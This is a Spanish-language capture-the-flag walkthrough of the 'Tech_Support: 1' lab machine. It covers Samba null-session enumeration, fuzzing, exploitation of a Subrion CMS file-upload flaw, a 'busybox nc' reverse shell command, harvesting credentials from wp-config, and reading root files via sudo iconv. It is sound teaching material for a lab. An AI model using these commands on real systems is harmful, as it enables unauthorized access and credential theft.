# Máquina Tech_Support: 1
### Descripcion:
- Dificultad: Easy
- S.O: Linux
### Conectividad

Primero de todo hacemos un ping a la máquina para ver si tenemos conectividad y gracias al ttl vemos que es una maquina linux

![Ping](Img/ping.png)

### Ennumeración de puertos

Ahora vamos a realizar los escaneos de nmap para ver los puertos abiertos y servicios que corren en esta máquina

```bash
nmap <IP> -p- -sS --min-rate 5000 -Pn -n -vvv -oG allports
```

![Allports-nmap](Img/Allports-nmap.png)

```bash
nmap <IP> -p22,80,139,445 -sCV -oN targeted
```

![Targeted-nmap](Img/Targeted-nmap.png)

Viendo los resultados de nmap vemos:
- 22 <- ssh - No tenemos credenciales asi que de momento no vamos a hacer nada
- 80 <- http - Página web
- 139 & 445 <- samba - Servicio de samba por red, muy interesante

### Enumeración Samba

Lo primero que voy a hacer es ennumerar samba ya que puede haber información sensible de la cual me pueda aprovechar

Con smbmap veo los recursos compartidos en el sistema y si me conecto con una null session puedo ver esto:

```bash
smbmap -H <IP>
```

![smbmap](Img/smbmap.png)

Con smbclient me conecto a websvr que es el unico recurso compartido al cual tengo acceso y me descargo la carpeta 'enter.txt' que esta dentro

```bash
smbclient -N \\\\<IP>\\websvr
```

```bash
get enter.txt
```

En este archivo están las credenciales de admin para subrion

![Enter](Img/enter.png)

Vemos que la contraseña esta cifrada así que utilizamos cyberchef

![cyberchef](Img/cyberchef.png)
### Página web

Ahora gracias a las credenciales que hemos descargado del samba vamos a ir a la pagina web

Vemos que la pagina web es un ubuntu default page, en el archivo vemos que tambien hace referencia a un wordpress, para ver con mas profundidad vamos a fuzzear la web con gobuster

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
```

El resultado de gobuster nos da el directorio /test y /wordpress los cuales me llaman la atención

![Gobuster](Img/gobuster.png)

Por lo que hemos encontrado en el smb sabemos que tiene que haber un /subrion/panel asi que nos metemos con las credenciales que ya tenemos

![subrion](Img/subrion.png)

### Explotación de CMS

La version de subrion es la 4.2.1 y esta tiene la vulnerabilidad Arbitrary File Upload y en exploit db hay un exploit en python

Ejecutamos el exploit de esta manera y ya tenemos shell como www-data

![Script](Img/script.png)

Como estamos en una shell bastante limitada en la cual no podemos movernos de directorio, me he hecho una reverse shell y probando me ha funcionado esta

```bash
busybox nc <IP> <PORT> -e /bin/bash
```

Navegando un poco por los directorio he encontrado el wp-config en /var/www/html/wordpress donde contiene una credencial 

![wp-config](Img/wp-config.png)

Al probar esta credencial con el usuario scamsite vemos que es esa la contraseña

![](Img/scamsite.png)

### Escalada de privilegios

Con el comando 'sudo -l' veo que puedo ejecutar como root el binario iconv que me permite ver archivos del sistema

![sudo -l](Img/sudo-l.png)

![](Img/gtfobins.png)

Con el siguiente comando vemos la flag de root

```bash
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```

![root](Img/root.png)
### Aprendido

- Reconocimiento de samba
- Explotacion de CMS vulnerable
- Archivo de configuracion con contraseña en texto claro
- Escalada de privilegios con comando ejecutado por root sin pedir contraseña